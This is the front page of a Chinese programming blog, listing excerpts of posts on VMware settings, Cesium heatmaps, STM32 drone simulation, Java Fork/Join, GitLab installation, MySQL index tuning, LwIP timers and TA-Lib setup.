<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="菜鸟程序员博客">
		<meta property="og:title" content="菜鸟程序员博客" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/876307763415bf4491834a49eda22e5a/" rel="bookmark">
			您在运行该虚拟机时启用了侧通道缓解。侧通道缓解可增强安全性，但也会降低性能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可能导致虚拟机网络突然连不上等异常，都可以使用此法解除 由于Windows11添加了设备核心安全选择测通道第一步 由于Windows11添加了设备核心安全选择测通道 旧的虚拟机打开后会出现，以下图：
第一步 在虚拟机关机状态进行设置改动最好。
点击虚拟机-&gt;设置-&gt;选项
点击上面的“高级”。
勾选上图的黄色块选项
然后确定，虚拟机不会出现提示了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4c9644a9d80a00764498d92b4404804/" rel="bookmark">
			Cesium源码分享--3d热力图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Cesium 3d热力图插件 在线体验 gitee：https://gitee.com/caozl1132/cesiumExp-heatmap3d
github：https://github.com/gitgitczl/cesiumExp-heatmap3d
ps：如果可以的话，希望大家能给我个star，好让我有更新下去的动力；
实现原理：
核心是使用了heatmap.js这个库，这个库生成的热力图是用canvas绘制的，那么在Cesium中，我们只要将canvas转图片，当初材质贴到我们的对象上就行。因为要做3d热力图，所以要采用geometry自己构建了顶点着色器，然后材质和二维热力图一样，还是使用了材质贴图。
三维热力图与二维热力图的唯一区别在于使用顶点坐标与顶点缓冲区的构建，注意在构建顶点缓冲区时，边界要单独处理。此案例中，我对于边缘部分的计算还有瑕疵。
调用方法：
new Heatmap3d(viewer, { list: list, raduis: 15, baseHeight: 800, primitiveType: "TRNGLE", gradient: { ".3": "blue", ".5": "green", ".7": "yellow", ".95": "red" } }) 支持原heatmap.js的参数传参，具体可见src/js/heatmap.js类，并且primitiveType支持了两种类型，TRANGLE（面）以及LINES（网格）
其它：
qq群：606645466（GIS之家共享交流群）
更多案例地址 更多免费数据 开发文档说明
其它源码下载（标绘、量算、动态材质、漫游、地图分析等）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/645981d22a389aeb66940018d346cd25/" rel="bookmark">
			【Proteus仿真】【STM32单片机】物资空投无人机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、功能简介二、软件设计三、实验现象联系作者 一、功能简介 本项目使用Proteus8仿真STM32单片机控制器，使用LCD1602显示模块、HCSR04超声波、SG90舵机、
无线遥控、陀螺仪、螺旋桨驱动电机、红外寻迹避障模块等。
主要功能：
系统运行后，LCD1604显示传感器检测的俯仰角、横滚角、超声波距离、红外检测信号状态及小车运行状态等；系统默认处于手动模式，可通过无线遥控控制无人机飞行，当发送模式设置指令，系统进入自动模式；通过左右红外检测使无人机按照指定轨迹运行，当超声波检测距离小于避障距离则无人机上升避障，完成后下降继续按照轨迹飞行。当检测到定点投物位置时，无人机开始下降，当到达指定点后开启舵机夹具。在飞行过程中系统根据无人机姿态角度自动调整到平衡位置。
无线遥控指令：
0X01–&gt;前进
0X02–&gt;后退
0X03–&gt;左转
0X04–&gt;右转
0X05–&gt;上升
0X06–&gt;下降
0X07–&gt;停止
0X08–&gt;夹具开启
0X10–&gt;模式
二、软件设计 /* 作者：嗨小易（QQ：3443792007） */ //系统功能控制 void sys_fun_ctrl(void) { //手动控制模式 if(sys_ctrl.mode==1) { switch(USART1_RX_BUF[0]) { case STOP_CMD: USART1_RX_BUF[0]=0;sys_ctrl.dir=0;break; case FORWD_CMD: USART1_RX_BUF[0]=0;sys_ctrl.dir=1;break; case BACK_CMD: USART1_RX_BUF[0]=0;sys_ctrl.dir=2;break; case LEFT_CMD: USART1_RX_BUF[0]=0;sys_ctrl.dir=3;break; case RIGHT_CMD: USART1_RX_BUF[0]=0;sys_ctrl.dir=4;break; case UP_CMD: USART1_RX_BUF[0]=0;sys_ctrl.dir=5;break; case DOWN_CMD: USART1_RX_BUF[0]=0;sys_ctrl.dir=6;break; case OPEN_CMD: USART1_RX_BUF[0]=0; sg90_set_angel(4); delay_ms(200); sg90_set_angel(0); break; } } //自动控制模式 else { //未到达目的地 if(sys_ctrl.destok==0) { //有感应到目的地位置 if(sys_ctrl.dest==1)sys_ctrl.dir=6; //没有感应到目的地位置 else { //根据红外感应按照轨迹运行 switch(sys_ctrl.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/645981d22a389aeb66940018d346cd25/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16c5d02bb44b1f4beb88c8246fe5a9da/" rel="bookmark">
			java并发编程：Fork/Join并发框架介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Fork/Join简介工作窃取算法Fork/Join的具体实现ForkJoinTaskfork()方法join()方法 ForkJoinPoolWorkQueuerunState Fork/Join的异常处理Fork/Join的使用 Fork/Join简介 Fork/Join框架是一个实现了ExecutorService接口的多线程处理器，它专为那些可以通过递归分解成更细小的任务而设计，最大化的利用多核处理器来提高应用程序的性能。
与其他ExecutorService相关的实现相同的是，Fork/Join框架会将任务分配给线程池中的线程。而与之不同的是，Fork/Join框架在执行任务时使用了工作窃取算法。
fork在英文里有分叉的意思，join在英文里连接、结合的意思。顾名思义，fork就是要使一个大任务分解成若干个小任务，而join就是最后将各个小任务的结果结合起来得到大任务的结果。
Fork/Join的运行流程大致如下所示：
需要注意的是，图里的次级子任务可以一直分下去，一直分到子任务足够小为止。用伪代码来表示如下：
solve(任务): if(任务已经划分到足够小): 顺序执行任务 else: for(划分任务得到子任务) solve(子任务) 结合所有子任务的结果到上一层循环 return 最终结合的结果 通过上面伪代码可以看出，我们通过递归嵌套的计算得到最终结果，这里有体现分而治之(divide and conquer) 的算法思想。
工作窃取算法 工作窃取算法指的是在多线程执行不同任务队列的过程中，某个线程执行完自己队列的任务后从其他线程的任务队列里窃取任务来执行。
工作窃取流程如下图所示：
值得注意的是，当一个线程窃取另一个线程的时候，为了减少两个任务线程之间的竞争，我们通常使用双端队列来存储任务。被窃取的任务线程都从双端队列的头部拿任务执行，而窃取其他任务的线程从双端队列的尾部执行任务。
另外，当一个线程在窃取任务时要是没有其他可用的任务了，这个线程会进入阻塞状态以等待再次“工作”。
Fork/Join的具体实现 Fork/Join框架简单来讲就是对任务的分割与子任务的合并，所以要实现这个框架，先得有任务。
在Fork/Join框架里提供了抽象类ForkJoinTask来实现任务。
ForkJoinTask ForkJoinTask是一个类似普通线程的实体，但是比普通线程轻量得多。
fork()方法 其实fork()只做了一件事，那就是把任务推入当前工作线程的工作队列里。
来看下fork()的源码：
public final ForkJoinTask&lt;V&gt; fork() { Thread t; // ForkJoinWorkerThread是执行ForkJoinTask的专有线程，由ForkJoinPool管理 // 先判断当前线程是否是ForkJoin专有线程，如果是，则将任务push到当前线程所负责的队列里去 if ((t = Thread.currentThread()) instanceof ForkJoinWorkerThread) ((ForkJoinWorkerThread)t).workQueue.push(this); else // 如果不是则将线程加入队列 // 没有显式创建ForkJoinPool的时候走这里，提交任务到默认的common线程池中 ForkJoinPool.common.externalPush(this); return this; } join()方法 Join() 的主要作用是阻塞当前线程并等待获取结果。
来看下join()的源码：
public final V join() { int s; // doJoin()方法来获取当前任务的执行状态 if ((s = doJoin() &amp; DONE_MASK) !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/16c5d02bb44b1f4beb88c8246fe5a9da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c022bf5fdf084144cb1019023fd19b5f/" rel="bookmark">
			spring Security 详情
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SpringSecurity框架【详解】_不易撞的网名的博客-CSDN博客（推荐）
Spring Security详细讲解(JWT+SpringSecurity登入案例)_jwt+spring security_嘟嘟的程序员铲屎官的博客-CSDN博客
springSecurity+JWT+Redis权限认证（完整项目代码）_小lee学编程的博客-CSDN博客 （推荐）
SpringSecurity+jwt+Redis实现权限控制_琳酱我爱你的博客-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8230c4ab88941faa7615a0401d181f23/" rel="bookmark">
			COMSOL声学文献详解，小白也能秒懂
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		来源公众号：COMSOL仿真交流
声学特性仿真
前言
为灵活调控声波的透射和损耗，在单层板、双层板、加筋板的基础上，多层均匀材料复合结构受到广泛关注，研究其声反射和透射特性具有重要意义。
海军装备部装备项目管理中心根据平面波正入射基本理论，以三明治夹芯平板结构为对象，利用COMSOL开展了声学特性仿真分析，研究其在正入射条件下的声学特性。
基本理论
1、声学有限元仿真 对于弹性体的声学分析是一个流固耦合问题，弹性体在流体载荷作用下将会发生变形和运动，与此同时固体的形变等反过来也将对流体产生影响。在流体域中，声压的分布满足下式：
式中：c 0c0 为流体中的声速；pp 为声压；▽为梯度算子；▽={α/αx，α/αy，α/αz} ；▽T 为梯度算子的转置。
式 (1) 称为 Helmholtz 积分公式，是求解结构声学特性的理论基础。根据变分原理，上述连续计算域可被离散为多个小的计算域，也就是完成了单元离散，此时原有的积分公式被转换为了线性方程组，通过数值方法求解表征结构声学特性的各个参数。在弹性结构中，位移及其导数也需要满足结构的振动方程：
式中：{FS} 和 {FP}分别为固体结构受到的机械激励载荷与流体作用载荷；{δ}为结构位移矢量，包含 3 个方向分量；[MS]和[KS] 分别为结构的整体刚度矩阵和整体质量矩阵，可通过单元刚度矩阵、单元质量矩阵组装得到。
其中：ρs 为材料密度；[D] 为弹性矩阵，反映了材料的本构关系；[Bδ] 为应变矩阵，表示应力和应变之间的关系；[Nδ] 为位移插值形函数矩阵。此外，在流体和结构的交界面存在连续性条件，包括结构法向应力与流体声压大小相等，以及法向质点位移连续。最后，在本问题中切向应力与位移都为 0。
2、基于无限大平板的反射透射系数 对于无限大平板问题(厚度为d，密度为ρ，杨氏模量为E，泊松比为σ )，平板两侧为2种不同的流体，分别为流体1和流体2，其中流体1的密度和声速可表示为ρ1和c1，流体2中则为ρ2和c2。当平面声波从流体1向平板人射时(人射角为θ1)，平板的反射系数R和透射系数T此时都为复数，如下式：
其中：G和H为传递矩阵中相应的元素；Z1和Z2分别为流体1和流体2的阻抗，Z1=ρ1c1/cosθ1，Z2=ρ2c2/cosθ2，Zb为板中的纵波阻抗，Z为板中的横波阻抗，Zc=ρc/cosθc，Zp=ρb/cosθb；θc为板中纵波的折射角；θb为板中横波的折射角。
3、有限元模型验证 在计算声学问题时，利用 COMSOL 中的声学模块，可以模拟声学物理场的状态，将压力声学与结构力学2 个物理场进行耦合，准确地模拟出弹性体声学分析的流固耦合力学问题，再利用 COMSOL 声学模块中压力声学模块的频域接口对 Helmholtz 方程进行求解，得到反射声压 pra 和透射声压 pta，进一步根据反射系数与透射系数的定义式 (6) 和式 (7) 求得反射透射系数。
本文利用 COMSOL 进行计算分析，为了验证本文计算所使用的计算模型以及有限元软件的有效性，将利用 COMSOL 对单层金属板声强透射系数计算结果与理论解进行对比验证。
有限元计算模型中平面波沿 Y 轴负方向入射，其结构如图 1 所示。该单元从上至下被分为 5 层，最上层为完美匹配层（PML 层），其厚度设置为 10 mm；第 2 层为厚度为 20 mm 的水域，第 3 层为厚度为 30 mm 的铝板，第 4 层同样为厚度为 20 mm的水域，最下层为厚度为 10 mm 的 PML 层。其中水域的密度设置为 1 000 kg/m3，声速设置为 1 500 m/s。铝板的材料参数为：泊松比δ=0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8230c4ab88941faa7615a0401d181f23/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f38f429f14992c54e0dac2ffc4e37555/" rel="bookmark">
			GitLab环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、GitLab是什么？二、安装步骤1.环境准备2.安装3.配置启动 总结 前言 之前搭建的版本比较旧，目前官方对先前搭建的版本已不再提供支持！ 同时也是为了了解新版本的新功能，同时为集成以及CI/CD做准备！ 下面是文章正文，希望能帮到您
一、GitLab是什么？ GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的Web服务。如今，它变得更加强大。GitLab is the most comprehensive AI-powered DevSecOps Platform.
二、安装步骤 1.环境准备 系统准备： # cat /etc/redhat-release CentOS Linux release 7.9.2009 (Core) ## 软件包版本 # rpm -qa | grep gitlab gitlab-ce-16.0.2-ce.0.el7.x86_64 这里面有ee版本和ce版本的区别 https://packages.gitlab.com/install/repositories/gitlab/gitlab-ee/script.rpm.sh 这里只研究ce（社区版）的 https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh 安装前的系统检查以及配置脚本，这种方式针对可以访问公网地址可以通过脚本链接处理一些必要依赖等：
script.rpm.sh
# vi script.rpm.sh #!/bin/bash unknown_os () { echo "Unfortunately, your operating system distribution and version are not supported by this script." echo echo "You can override the OS detection by setting os= and dist= prior to running this script.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f38f429f14992c54e0dac2ffc4e37555/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc07e5dd48b3c8c5cdc58ba4846369cf/" rel="bookmark">
			使用ENSP在MPLS-VPN网络中获取HTTP报文
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实验思路： 在MPLS网络中配置两台互通的CE：其中一台CE下存在HTTP服务器（自己搭建的），另外一台下存在PC（Windows系统），在PC上通过网页访问到HTTP服务器。我们在ENSP中配置的MPLS网络中抓取数据报文。
实验步骤： 1.在服务器虚拟机上搭建一台HTTP服务器（如果没有服务器也可以用自己电脑的VMware模拟）（本博客主要是介绍ENSP中的云的用法），这里的虚拟机使用Windows server 2019 系统，用到了xampp-windows-x64-8.2.0-0-VS16- （是一款HTTP服务器搭建软件，一键安装很方便），软件我上传到文章最后。
2.在自己的PC上使用VMware安装一台Windows系统，这里使用的是Windows 7 。
3.在ENSP上的MPLS-VPN网络中增加两台CE，并保证两台CE可以互访。（MPLS网络的配置脚本可以看之前写的博客）
4.在这两台CE上，其中一台通过Cloud与Windows7系统互联，另一台通过Cloud与HTTP服务器互联。
5.配置Windows7，HTTP服务器的网络，包括IP地址，掩码，网关。
6.在Windows7上通过网页打开HTTP服务器，同时在ENSP中进行抓包。
实验内容： 1.在虚拟机服务器上完成HTTP服务器搭建，不过多解释，通过附件软件安装完成后，提示下述截屏表示成功。
2.完成Windows 7 的系统安装，在自己PC的VMware 上完成安装即可，如图：
3.在ENSP中实验网络拓扑的两个PE下各新增一台CE，如图所示：
4.之后新增cloud与新增的CE相连接：
两台cloud的配置信息如下图：
这样便完成了两台虚拟机与两台CE的互联，但是需要注意的是两台虚拟机网络需要进行如下配置，以Windows7举例如下图：
网关信息需要配置为直连路由器的那个接口地址的IP。
5.最后在Windows7 系统的浏览器下输入HTTP服务器的IP地址，同时在ENSP中进行抓包。
这样便通过ENSP实现了两台虚拟机的互访，并获取到HTTP报文。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cae9e7fbbe51e5df3e1b8335687cb089/" rel="bookmark">
			Vue毕业设计——基于Vue&#43;SpringBoot&#43;MySQL的测试事务管理平台设计与实现（毕业论文&#43;程序源码）——测试事务管理平台
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于Vue+SpringBoot+MySQL的测试事务管理平台设计与实现（毕业论文+程序源码） 大家好，今天给大家介绍基于Vue+SpringBoot+MySQL的测试事务管理平台设计与实现，文章末尾附有本毕业设计的论文和源码下载地址哦。需要下载开题报告PPT模板及论文答辩PPT模板等的小伙伴，可以进入我的博客主页查看左侧最下面栏目中的自助下载方法哦
文章目录：
基于Vue+SpringBoot+MySQL的测试事务管理平台设计与实现（毕业论文+程序源码）1、项目简介2、资源详情3、关键词4、毕设简介5、资源下载 1、项目简介 本选题针对目前的软件测试用例管理平台进行进一步开发，设计以MySQL作为数据库，基于SpringBoot、Vue.js实现B/S架构。根据实际生产需求，将平台划分为用户管理、测试用例管理、自动化测试框架管理三大模块。测试用例管理模块除测试用例管理功能方便测试用例评审和复用之外，增加两个功能：一是通过链接的形式关联缺陷报告管理功能，其意义在于减少测试人员反馈测试问题时需描述用例场景的工作量，提高测试工作效率，形成测试流程闭环；二是测试用例自动生成功能，可以基于分词和推荐算法实现已有相关测试用例推荐功能，还可以根据边界值分析法等测试理论实现测试用例的自动生成，将部分人工工作量转化为自动化工作量，提高测试工作效率，降低人为因素对测试过程的干扰。本文针对以上需求，在平台上实现了以上功能，通过对用例图描述每个模块的基本功能，通过E-R图、数据流图、时序图进行了概要设计和详细设计，最终开发出测试事务管理平台。开发结束后对该系统进行了充分测试，测试结果表明本系统满足测试需求。后续相关使用人员调查表明，本平台的测试用例管理关联缺陷报告管理功能大大节约了测试人员和开发人员的沟通成本，减少了测试人员对复现场景描述的工作量，实现了测试流程的快速推进；测试用例推荐和自动生成功能在一定程度上减少了测试人员编写测试用例的时间，弥补了测试人员编写测试用例时由于不熟悉关联业务而导致考虑不周的问题，提高了测试工作质量和效率。 2、资源详情 项目难度：中等难度
适用场景：相关题目的毕业设计
配套论文字数：19322个字45页
包含内容：全套源码+配整论文
开题报告、论文答辩、课题报告等ppt模板推荐下载方式：
3、关键词 软件质量保障；测试用例管理；B/S架构；推荐算法；边界值分析法 4、毕设简介 提示：以下为毕业论文的简略介绍，项目完整源码及完整毕业论文下载地址见文末。
1 绪论
1.1 课题研究背景及意义
随着计算机软件复杂度不断提升，人们更加看重软件的使用体验及安全等方面。随之而来的问题就是软件从业者如何保证软件质量，保证用户信息和资产安全，提高用户产品使用体验。因此，软件测试行业逐渐趋向成熟[2]。
软件测试是软件生命周期中保证软件质量的重要过程，这个过程的核心任务在于严格执行有效的软件测试用例，及时反馈测试问题。因此，通过开发可视化测试用例管理平台完成测试事务的跟进和合作十分重要。
1.2 国内外研究现状
省略
1.3 课题研究目标与内容
基于以上，本课题预期目标设计并实现测试用例管理及生成系统，针对需求实现测试用例管理和缺陷问题跟进，兼容自动化测试框架管理，实现测试流程闭环。
该系统宏观分为用户管理、测试用例管理、自动化框架管理三个模块，其中用户管理基于企业应用实际，主要进行用户信息记录和根据职位不同进行权限分配；测试用例管理主要包括测试用例的生成、维护、跟踪和统计功能，其中生成功能可以进行测试用例的自动生成并保存至平台；除此之外，可根据实际执行情况修改执行状态和实际结果，并关联缺陷报告；自动化框架管理基于GitHub实现自动化测试代码的管理并统计代码覆盖率情况、生成自动化测试报告，自动化测试报告使用 JaCoCo 插件，在代码中进行插桩统计覆盖率，生成覆盖率报告index.html文件，并统计自动化测试用例执行情况，形成自动化测试报告。
1.4 论文组织结构介绍
本文论文结构基于软件工程开发模型中的瀑布模型，共分为7章。
第1章：绪论，介绍本平台的研究背景、国内外测试行业的现状和针对当前现状进行测试工具改进的目标。
第2章：相关理论基础与关键技术综述，介绍在本项目开发过程中使用的核心算法相关理论基础与关键开发技术。
第3章：需求分析，主要基于作者实习期间的工作经历，介绍本平台的需求及其可行性。
第4章：概要设计，介绍该平台的总体架构设计方案、功能模块设计方案、数据库设计方案等。
第5章：详细设计与实现，介绍文中涉及到的界面层、业务逻辑层、核心算法层的详细实现方式设计和实现结果展示。
第6章：测试，介绍平台相关运行环境，在此基础上对平台进行功能测试，确保平台符合需求要求。
第7章：结论，对平台设计与实现进行全面总结，包括开发工作、开发结果以及后续优化等内容。
1.5 本章小结
本章主要描述了课题背景，并详细讨论课题的意义以及相关课题的研究现状，还明确了主要的研究目标和内容，并介绍了论文的组织结构，对整个课题的工作进行全面概述。
2 相关理论基础与关键技术
2.1 基础测试理论
2.1.1 软件测试流程
根据作者实习经历，软件测试工作的主要流程为：需求评审、技术评审、制定测试用例、评审测试用例、冒烟测试、正式测试、回归测试、编写并提交测试报告。
在本课题中，测试用例通过关联需求文档和缺陷报告，形成测试流程闭环，提高测试效率。
2.1.2 主要测试方法
从是否关心软件内部结构和具体实现的角度划分，测试方法主要有白盒测试和黑盒测试。白盒测试方法主要有代码检査法、语句覆盖等，黑盒测试方法主要包括等价类划分法、边界值分析法、判定表驱动法等[5]。除此之外，测试方法按软件特性还可分为功能测试、性能测试、兼容性测试、安全测试等[6]。
在本课题中，根据以上测试方法实现测试用例自动生成功能，对于取值范围使用边界值分析法；除此之外，还可实现功能测试对于字符串输入采用等价类划分法，对于参数组合采用判定树/判定表法，对操作流程判断采用分支覆盖法等；性能测试提取并发数、并发持续时间、业务类型及业务占比、生产环境基础数据量、预期响应时间、系统其他特殊性能值需求（如net I/O不能占用带宽1/2）等；兼容性测试可根据自动爬取网络上主流的浏览器类型、操作系统、手机端机型的统计数据和导入项目组在APP启动时埋点生成的数据分析报表资源，生成推荐测试列表；安全测试关注输入内容的敏感信息加密、批量操作可行性、密码的SQL注入等情况。
2.1.3 测试用例设计
一条完整的测试用例，一般包括用例编号、用例标题、前提条件、操作步骤、预期结果等[7]，需要满足以下原则：
（1）全面性：输入数据要包括合法的、边界内的、常规的数据，也要包括非法的、边界上的、超过边界的、不合理的数据。
（2）代表性：选取其中具有代表性的数据作为输入数据，减少测试用例的冗余性。
（3）可判定性：每个用例必须要有明确的输出结果，用来判断实际结果是否符合预期，进而判定软件质量。
（4）可操作性：需要描述清楚操作步骤，不同步骤对应不同的输出结果，在测试前做好足够的准备工作，以提高测试的效率。
（5）可再现性：在执行测试用例的过程中，相同的测试用例系统所执行的测试结果是相同，以便复现和定位问题[8]。
在本课题中，基于测试用例内容和设计原则的需求，进行了相关数据库设计，确保系统的实用性。
2.2 分词算法
分词方法有标准分词、NLP分词、索引分词、N-最短路径分词、CRF分词以及极速词典分词等[9]。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cae9e7fbbe51e5df3e1b8335687cb089/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/350847c8f7d397a826e3bc08b457241c/" rel="bookmark">
			05_MySQL索引优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		四种：1.主键 2.单值 3.唯一 4.复合
1. 性能分析（explain） mysql5.6以后优化器做了很多改进，执行时会自动进行大量的优化，很多现象需要在5.5才能演示成功。
1.1 explain是什么? 模拟优化器查看执行计划
使用EXPLAIN关键字可以模拟优化器执行SQL查询语句，从而知道MySQL是如何处理你的SQL语句的。分析你的查询语句或是表结构的性能瓶颈
1.2 explain能干什么？ 表的读取顺序
那些索引可以使用
数据读取操作的操作类型
那些索引被实际使用
表之间的引用
每张表有多少行被物理查询
1.3 explain怎么玩？ explain + SQL语句
官方文档：MySQL :: MySQL 8.0 Reference Manual :: 8.8.2 EXPLAIN Output Format
数据准备：
CREATE TABLE t1(id INT(10) AUTO_INCREMENT, content VARCHAR(100) NULL, PRIMARY KEY (id)); CREATE TABLE t2(id INT(10) AUTO_INCREMENT, content VARCHAR(100) NULL, PRIMARY KEY (id)); CREATE TABLE t3(id INT(10) AUTO_INCREMENT, content VARCHAR(100) NULL, PRIMARY KEY (id)); CREATE TABLE t4(id INT(10) AUTO_INCREMENT, content VARCHAR(100) NULL, PRIMARY KEY (id)); # 以下新增sql多执行几次，以便演示 INSERT INTO t1(content) VALUES(CONCAT('t1_',FLOOR(1+RAND()*1000))); INSERT INTO t2(content) VALUES(CONCAT('t2_',FLOOR(1+RAND()*1000))); INSERT INTO t3(content) VALUES(CONCAT('t3_',FLOOR(1+RAND()*1000))); INSERT INTO t4(content) VALUES(CONCAT('t4_',FLOOR(1+RAND()*1000))); 演示：explain select * from t1, t2, t3 where t1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/350847c8f7d397a826e3bc08b457241c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53f1395d61e7c9119bca0e2a1ff053a9/" rel="bookmark">
			06_ MySQL优化实战
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 计算并指定索引长度 阿里开发手册：
强制】在 varchar 字段上建立索引时，必须指定索引长度，没必要对全字段建立索引，根据实际文本区分度决定索引长度。
说明：索引的长度与区分度是一对矛盾体，一般对字符串类型数据，长度为 20 的索引，区分度会高达 90%以上，可以使用 count(distinct left(列名，索引长度)) / count(*) 的区分度来确定。
测试：
-- address长度为10,当截取到5的时候查询区分度高达0.9572(dept表是随机数据 根据自己的情况判断) SELECT COUNT(DISTINCT LEFT(address,5)) / COUNT(*) FROM dept; -- 创建address列的索引并指定长度为5(address可以为空 varchar类型，字节数为：5*3+3 = 18) ALTER TABLE dept ADD INDEX idx_address(address(5)); -- 可以看到address使用的索引长度为18 EXPLAIN SELECT * FROM dept WHERE address IS NULL; 2. 实现并优化8个SQL #删除两个表的所有索引 #1、列出自己的掌门比自己年龄小的人员 EXPLAIN SELECT * FROM t_emp c INNER JOIN (SELECT a.id, a.deptName, b.age FROM t_dept a INNER JOIN t_emp b ON a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53f1395d61e7c9119bca0e2a1ff053a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7c89d73f96b27468c26df0467c3c5b6/" rel="bookmark">
			LwIP 之四 超时处理（timeouts.c/h）、定时器（ timers.c/h）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目前，网络上多数文章所使用的 LwIP 版本为1.4.1。最新版本为 2.0.3。从 1.4.1 到 2.0.3（貌似从 2.0.0 开始），LwIP 的源码有了一定的变化，甚至于源码的文件结构也不一样，内部的一些实现源文件也被更新和替换了。
2023.4.25 更新到最新版 2.1.3 简介 在 LwIP 中很多时候都要用到超时处理，超时处理的实现是 TCP/IP 协议栈中一个重要部分。LwIP 为每个与外界网络连接的任务都有设定了 timeout 属性，即等待超时时间。超时处理的相关代码实现在 timeouts.c/h 中，基本内容整理如下：
/* 第一部分：定义LwIP内部使用使用的循环定时器 */ const struct lwip_cyclic_timer lwip_cyclic_timers[]; /* 第二部分：各函数 */ #if LWIP_TIMERS &amp;&amp; !LWIP_TIMERS_CUSTOM /* 使用 LwIP提供的定时器 */ /* 对外提供的第一个函数*/ void tcp_timer_needed(void); lwip_cyclic_timer(void *arg); void sys_timeouts_init(void);	/* 初始化本模块 */ void sys_timeout(u32_t msecs, sys_timeout_handler handler, void *arg) /* 注册函数 */ void sys_untimeout(sys_timeout_handler handler, void *arg) void sys_check_timeouts(void) void sys_restart_timeouts(void) u32_t sys_timeouts_sleeptime(void) #else /* 用户自定义定时器 */ void tcp_timer_needed(void)	/* 必须由外部实现该函数 */ { } #endif 在 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d7c89d73f96b27468c26df0467c3c5b6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40d17e3946001db6289f4815addd3aa5/" rel="bookmark">
			windows python TA-Lib 库 源码安装 Python安装talib库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先安装 最新的 visual studio 比如 下载社区版就可以
接着等下载完成后我们就开始来安装 visual studio
点击继续
选择桌面开发，点击安装
vs 安装完成后，我们来到TA-Lib/ta-lib-python github官方 仓库
GitHub - TA-Lib/ta-lib-python: Python wrapper for TA-Lib (http://ta-lib.org/).
如上图，如果我们直接用pip 安装，多数情况估计都会失败，然后我们会去其它网站找对应版的python talib 打包好的whl 安装，这种方式很显然不是我想要的，我想的是一次配置，后面新的环境或python 版本，直接pip不安装了，不用每次都这么麻烦，好接下来正式开始
我们接着这个页面往下看
我们看到上面介绍提到依赖，这是关键，安装python talib库，它需要本地有talib 编译好的lib库，所以我们要先编译好windows上的talib 库
接着往下看
